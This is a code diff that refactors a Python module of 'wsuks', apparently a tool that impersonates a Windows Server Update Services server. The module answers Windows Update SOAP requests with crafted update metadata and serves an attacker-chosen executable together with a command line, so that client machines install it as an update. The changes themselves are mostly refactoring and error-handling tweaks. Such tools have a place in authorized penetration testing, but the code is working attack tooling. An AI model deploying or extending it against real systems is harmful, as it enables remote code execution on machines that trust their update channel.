@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 
-from http.server import BaseHTTPRequestHandler, HTTPServer
+from http.server import BaseHTTPRequestHandler
+import logging
+import traceback
 from bs4 import BeautifulSoup
 from random import randint
 import uuid
@@ -10,7 +12,6 @@ import base64
 import hashlib
 import sys
 import os
-import argparse
 import wsuks
 
 
@@ -32,10 +33,13 @@ class WSUSUpdateHandler:
 
         self.executable = executable_file
         self.executable_name = executable_name
+        self.command = ''
         self.sha1 = ''
         self.sha256 = ''
 
         self.client_address = client_address
+
+        self.set_filedigest()
 
     def get_last_change(self):
         return (datetime.datetime.now() - datetime.timedelta(days=3)).isoformat()
@@ -44,9 +48,10 @@ class WSUSUpdateHandler:
         return base64.b64encode(b'A'*47).decode('utf-8')
 
     def get_expire(self):
-        return (datetime.datetime.now() + datetime.timedelta(days=1)).isoformat()
+        return (datetime.datetime.now() + datetime.timedelta(minutes=10)).isoformat()
 
     def set_resources_xml(self, command):
+        self.command = command
         # init resources
 
         path = os.path.abspath(os.path.dirname(wsuks.__file__))
@@ -72,9 +77,13 @@ class WSUSUpdateHandler:
                 file.close()
 
             with open('{}/xml_files/get-extended-update-info.xml'.format(path), 'r') as file:
-                self.get_extended_update_info_xml = file.read().format(revision_id1=self.revision_ids[0], revision_id2=self.revision_ids[1], sha1=self.sha1, sha256=self.sha256,
-                                                                       filename=self.executable_name, file_size=len(executable_file), command=html.escape(html.escape(command)),
-                                                                       url='http://{host}/{path}/{executable}'.format(host=self.client_address, path=uuid.uuid4(), executable=self.executable_name))
+                self.get_extended_update_info_xml = file.read().format(revision_id1=self.revision_ids[0],
+                                                                       revision_id2=self.revision_ids[1],
+                                                                       sha1=self.sha1, sha256=self.sha256,
+                                                                       filename=self.executable_name,
+                                                                       file_size=len(self.executable),
+                                                                       command=html.escape(html.escape(self.command)),
+                                                                       url=f'http://{self.client_address}/{uuid.uuid4()}/{self.executable_name}')
                 file.close()
 
             with open('{}/xml_files/report-event-batch.xml'.format(path), 'r') as file:
@@ -86,7 +95,9 @@ class WSUSUpdateHandler:
                 file.close()
 
         except Exception as err:
-            self.logger.error('Error: {err}'.format(err=err))
+            self.logger.error(f'Error: {err}')
+            if self.logger.level == logging.DEBUG:
+                traceback.print_exc()
             sys.exit(1)
 
     def set_filedigest(self):
@@ -100,16 +111,19 @@ class WSUSUpdateHandler:
             self.sha256 = base64.b64encode(hash256.digest()).decode()
 
         except Exception as err:
-            self.logger.error('Error in set_filedigest: {err}'.format(err=err))
+            self.logger.error(f'Error in set_filedigest: {err}')
+            if self.logger.level == logging.DEBUG:
+                traceback.print_exc()
             sys.exit(1)
 
     def __str__(self):
-        return f'The update metadata - uuids: {self.uuids},revision_ids: {self.revision_ids}, deployment_ids: {self.deployment_ids}, executable: {self.executable}, sha1: {self.sha1}, sha256: {self.sha256}'
+        return f'The update metadata - uuids: {self.uuids}, revision_ids: {self.revision_ids}, deployment_ids: {self.deployment_ids}, executable: {self.executable_name}, sha1: {self.sha1}, sha256: {self.sha256}, command: {self.command}'
 
 
 class WSUSBaseServer(BaseHTTPRequestHandler):
-    def __init__(self, logger):
+    def __init__(self, logger, wsusUpdateHandler):
         self.logger = logger
+        self.wsusUpdateHandler = wsusUpdateHandler
         super().__init__()
 
     def _set_response(self, serveEXE=False):
@@ -122,7 +136,7 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
 
         if serveEXE:
             self.send_header('Content-Type', 'application/octet-stream')
-            self.send_header("Content-Length", len(update_handler.executable))
+            self.send_header("Content-Length", len(self.wsusUpdateHandler.executable))
         else:
             self.send_header('Content-type', 'text/xml; chartset=utf-8')
 
@@ -145,7 +159,7 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
             self.logger.info("Requested: {path}".format(path=self.path))
 
             self._set_response(True)
-            self.wfile.write(update_handler.executable)
+            self.wfile.write(self.wsusUpdateHandler.executable)
 
     def do_POST(self):
 
@@ -161,27 +175,27 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
 
         if soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig"':
             # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/b76899b4-ad55-427d-a748-2ecf0829412b
-            data = BeautifulSoup(update_handler.get_config_xml, 'xml')
+            data = BeautifulSoup(self.wsusUpdateHandler.get_config_xml, 'xml')
 
         elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"':
             # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/36a5d99a-a3ca-439d-bcc5-7325ff6b91e2
-            data = BeautifulSoup(update_handler.get_cookie_xml, "xml")
+            data = BeautifulSoup(self.wsusUpdateHandler.get_cookie_xml, "xml")
 
         elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/RegisterComputer"':
             # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/b0f2a41f-4b96-42a5-b84f-351396293033
-            data = BeautifulSoup(update_handler.register_computer_xml, "xml")
+            data = BeautifulSoup(self.wsusUpdateHandler.register_computer_xml, "xml")
 
         elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/SyncUpdates"':
             # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/6b654980-ae63-4b0d-9fae-2abb516af894
-            data = BeautifulSoup(update_handler.sync_updates_xml, "xml")
+            data = BeautifulSoup(self.wsusUpdateHandler.sync_updates_xml, "xml")
 
         elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetExtendedUpdateInfo"':
             # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/862adc30-a9be-4ef7-954c-13934d8c1c77
-            data = BeautifulSoup(update_handler.get_extended_update_info_xml, "xml")
+            data = BeautifulSoup(self.wsusUpdateHandler.get_extended_update_info_xml, "xml")
 
         elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/ReportEventBatch"':
             # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/da9f0561-1e57-4886-ad05-57696ec26a78
-            data = BeautifulSoup(update_handler.report_event_batch_xml, "xml")
+            data = BeautifulSoup(self.wsusUpdateHandler.report_event_batch_xml, "xml")
 
             post_data_report = BeautifulSoup(post_data, "xml")
             self.logger.info('Client Report: {targetID}, {computerBrand}, {computerModel}, {extendedData}.'.format(targetID=post_data_report.TargetID.text,
@@ -191,7 +205,7 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
 
         elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService/GetAuthorizationCookie"':
             # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/44767c55-1e41-4589-aa01-b306e0134744
-            data = BeautifulSoup(update_handler.get_authorization_cookie_xml, "xml")
+            data = BeautifulSoup(self.wsusUpdateHandler.get_authorization_cookie_xml, "xml")
 
         else:
             self.logger.warning("SOAP Action not handled")
